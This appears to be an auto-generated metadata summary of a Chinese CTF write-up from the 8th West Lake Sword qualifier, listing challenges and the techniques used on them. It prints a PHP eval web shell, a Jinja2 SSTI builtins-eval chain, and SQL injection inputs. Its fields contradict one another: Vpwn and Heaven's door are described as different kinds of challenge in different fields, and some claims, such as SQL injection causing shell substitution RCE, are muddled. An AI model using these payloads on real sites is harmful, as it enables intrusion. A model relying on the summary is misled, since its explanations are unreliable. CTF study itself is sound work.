...
- PHPRCE写shell
- Vpwn
- PWN-Heaven's door,Crypto-matrixRSA,Disk取证,Crypto-DSA验证,内存取证AESEAX,Web-入异步并发查找
...
lesson: 1) SSTI黑名单绕:用unicode转义\u0062\u0069(对应b/i)拼builtins; 2) Express SQL注入:JSON.parse+字符串模板replace,username用$`反引号绕过引号过滤; 3) async并发查找PHP文件:aiohttp+aiohttp.TCPConnector(limit=600)并发扫描,目标URL/admin/Uploads/{md5}/ 找PHP; 4) PHP file_put_contents写shell:folder = "Uploads/127.0.0.1/"; content = "<?php phpinfo();@eval($_POST['cmd']); ?>"; 5) tshark提取DSA签名:'-T fields -e http.request.uri.query.parameter -e json.object -E separator=, > extracted_data.txt'; 6) PWN Vpwn 64位地址分32+32位写; 7) Heaven's door:32位shellcode+retfq+CS=0x33+open /proc/pid/mem+lseek SEEK_SET+write
quality: high
full_path: 第八届西湖论剑·中国杭州网络安全技能大赛网络攻防实战赛-初赛_WriteUp_by_金石滩小鲨鱼.full.md
meta_path: 第八届西湖论剑·中国杭州网络安全技能大赛网络攻防实战赛-初赛_WriteUp_by_金石滩小鲨鱼.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 第八届西湖论剑·中国杭州网络安全技能大赛网络攻防实战赛-初赛 WriteUp by 金石滩小鲨鱼。金石滩小鲨鱼第10名WP,12题(签到/Rank-l/sqli-or-not/Rank-U/Vpwn/Heaven's door/matrixRSA/糟糕的磁盘/blink/sharkp/easydatalog/DSASignatureData/easyrawencode),涵盖SSTI uni...
category: web
...
contest_type: open
wp_url: https://www.ctfiot.com/225187.html
wp_author: 金石滩小鲨鱼
reasoning_chain:
- 签到题：触发点：提示欢迎来到第八届 → 假设：page source 藏 flag → 动作：view-source
- Rank-l 触发点：Express SQL 注入 username$` → 假设：shell 变量替换 RCE → 动作：` or 1=1%23 注入
- Rank-U 触发点：SSTI username 字段 → 假设：Jinja eval → 动作：{{x.__init__.__globals__['__builtins__']['eval']}}
- Vpwn 触发点：phar 反序列化 → 假设：phar:// wrapper 触发 __destruct → 动作：构造 phar
- Heaven's door 题触发点：aarch64 fmt → 假设：fmt 改 X30 → 动作：%hn 写指针
- 糟糕的磁盘：触发点：和官方下篇同题 → 动作：5 img 合并
- blink 题触发点：JS async 并发 → 假设：600 并发找 php 路由 → 动作：asyncio 爆破
- matrixRSA / DSASignatureData / easyrawencode 同上 4 题思路
failed_attempts:
- 签到直接 ctf flag{} 搜 → 失败：藏在 page source 注释
- SSTI 直接 {{7*7}} → 失败：被黑名单过滤
- phar 试图用 file:// → 失败：phar:// 才触发
key_observations:
- Express SQL 注入 username 加 ` 反引号触发 shell 变量替换 = RCE 经典
- SSTI 8 进制 Unicode u002f 等价于 u002f 分隔符
- phar:// wrapper 触发反序列化是 LFI 类通用思路
- 异步并发爆破找路由：asyncio + aiohttp 提高爆破效率
prerequisites:
- Express 框架 SQL 注入
- Jinja2 SSTI 利用链（__globals__/__builtins__）
- phar 反序列化触发原理
- Python asyncio 异步并发
---
